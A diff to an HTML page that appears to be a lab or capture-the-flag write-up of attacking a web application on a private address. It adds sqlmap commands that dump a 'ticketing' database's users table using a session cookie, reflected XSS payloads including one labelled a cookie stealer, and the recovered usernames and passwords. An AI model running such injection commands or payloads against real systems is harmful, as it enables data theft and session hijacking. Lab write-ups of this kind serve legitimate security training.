@@ -49,4 +49,15 @@ privilege escalation, pivoting, service enumeration, and cron job exploitation</
 <ul>I could not find any method for SQL injection using SQLmap</ul>
 <ul>I installed OWASP ZAP and ran a scan on 192.168.1.105</ul>
 <ul>ZAP tells me SQL Injection is possible</ul>
+<ul>I utilized SQL Map again with the url provided by OWASP ZAP and with --schema</ul>
+<ul>sqlmap -u "http://192.168.1.105/index.php?search=" --cookie="PHPSESSID=tghl288gtp81as870k5fd6h7m6" --schema --dbms=mysql</ul>
+<ul>There are some critical connection timeouts but SQL Map continues where it can, just hang on</ul>
+<ul>SQLMap tells me that there is an XSS vulnerability in the SEARCH url</ul>
+<ul>http://192.168.1.105/index.php?search=%22%27%3E%3Cimg%20src%20onerror=alert(1)%3E&back=1</ul>
+<ul>Cookie stealer: http://192.168.1.105/index.php?search=%22%27%3E%3Cimg%20src%20onerror=alert(document.cookie)%3E&back=1</ul>
+<ul>After a while SQLMap cracked everything and showed the scheme</ul>
+<ul>In order to answer the question, the database <b>ticketing</b> with table <b>users</b> is most important</ul>
+<ul>sqlmap -u "http://192.168.1.105/index.php?search=" --cookie="PHPSESSID=tghl288gtp81as870k5fd6h7m6" -D ticketing --columns -T users --dbms=mysql</ul>
+<ul>sqlmap -u "http://192.168.1.105/index.php?search=" --cookie="PHPSESSID=tghl288gtp81as870k5fd6h7m6" --dump -D ticketing --columns -T users --dbms=mysql</ul>
+<ul>Users are jason (password GuessMe!), admin (T0ughT0Crack) and andy (Str0ngPassw0rd)</ul>
 </ol></p>
